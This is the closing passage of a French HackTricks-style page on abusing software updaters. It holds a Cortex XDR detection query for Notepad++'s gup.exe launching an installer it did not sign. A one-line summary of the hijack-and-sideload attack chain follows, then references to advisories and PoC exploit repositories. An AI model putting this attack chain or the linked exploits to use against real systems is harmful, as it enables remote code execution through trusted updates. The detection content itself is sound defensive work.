| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un programme d’installation autre que celui de Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ces schémas s’appliquent à tout updater qui accepte des manifests non signés ou ne vérifie pas les signataires des installateurs : détournement du réseau + installateur malveillant + sideloading signé avec son propre certificat entraînent une exécution de code à distance sous couvert de mises à jour « fiables ».

---
## References
- [1] [Avis – Netskope Client pour Windows – Élévation de privilèges locale via un serveur malveillant (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Avis de sécurité Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Compromission d’ASUS DriverHub, MSI Center, Acer Control Centre et Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB : NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Élévation de privilèges locale via des fichiers accessibles en écriture dans Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Élévation de privilèges dans l’agent Windows](https://checkmk.com/werk/16361)
- [10] [PoC sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Des acteurs étatiques exploitent la chaîne d’approvisionnement de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – mise à jour sur l’incident d’infrastructure détournée](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Contournement du correctif de CVE-2025-0309 dans Netskope Client pour Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Découverte de failles d’élévation de privilèges dans Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
